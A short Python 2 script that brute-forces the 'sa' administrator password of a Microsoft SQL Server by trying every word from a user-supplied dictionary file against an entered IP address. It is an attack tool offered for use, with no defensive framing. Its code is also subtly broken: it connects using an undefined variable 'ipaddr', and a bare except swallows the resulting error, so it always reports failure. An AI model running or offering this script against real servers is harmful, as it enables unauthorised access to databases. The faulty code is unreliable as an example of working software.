import _mssql
ip = raw_input("Enter IP of SQL server: ")
pwlist = raw_input("Enter path to the dictionary: ")
fileopen = file(pwlist, "r")
counter = 0
for line in fileopen:
    line = line.rstrip()
    try:

        target_server = _mssql.connect(ipaddr, "sa", line)
        target_server.select_db('master')
        counter = 1
        print "[*] Successfully brute forced user account of sa password of " + line
        break

    except: 
        pass

if counter == 0:
    print "[!] Unable to brute force the accounts - sorry boss"
if counter == 1:
    print "Successfully brute forced account!"
